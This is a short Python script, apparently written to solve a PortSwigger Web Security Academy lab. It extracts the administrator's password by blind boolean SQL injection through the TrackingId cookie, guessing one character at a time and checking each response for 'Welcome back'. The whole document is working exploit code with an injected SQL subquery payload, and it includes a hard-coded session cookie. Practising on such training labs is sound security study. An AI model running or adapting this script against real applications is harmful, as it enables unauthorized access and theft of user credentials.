import requests

url = "https://0a8300000338d73b822adddc00f00096.web-security-academy.net/filter?category=Gifts"
session = "sFbfcncNDpeDJQcA8izJnYVTlcQcVzJL"
tracking_id = "ExXOIruoccurnFw5"
characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for position in range(1, 21):
    for char in characters:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        cookies = {
            "TrackingId": payload,
            "session": session
        }
        response = requests.get(url, cookies=cookies)
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char} → password so far: {password}")
            break

print(f"\nFull password: {password}")
